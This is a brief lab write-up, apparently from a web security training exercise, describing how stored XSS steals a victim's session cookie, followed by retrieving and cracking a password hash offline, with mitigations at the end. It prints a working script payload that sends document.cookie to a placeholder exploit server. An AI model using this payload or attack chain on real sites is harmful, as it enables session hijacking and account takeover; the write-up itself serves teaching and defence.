# Offline Password Cracking

## Vulnerability

The application is vulnerable to **Stored Cross-Site Scripting (XSS)**, allowing an attacker to steal another user's session cookie. After gaining access to the victim's account, the attacker can obtain the victim's password hash and crack it offline.

## How an attacker exploits it

1. Inject a malicious JavaScript payload into the comment section
2. When the victimviews the comment, the script sends their session cookie to the attacker's exploit server
3. Use the stolen session cookie to access Carlos's account
4. Retrieve Carlos's password hash from the account page
5. Crack the hash offline using a tool such as **Hashcat**
6. Log in using the recovered plaintext password

## Payload Used

```html
<script>
document.location='https://YOUR-EXPLOIT-SERVER/exploit?cookie='+document.cookie;
</script>
```

## Mitigation

* Prevent XSS by validating and encoding user input
* Store passwords using strong hashing algorithms with unique salts
* Restrict access to sensitive information such as password hashes
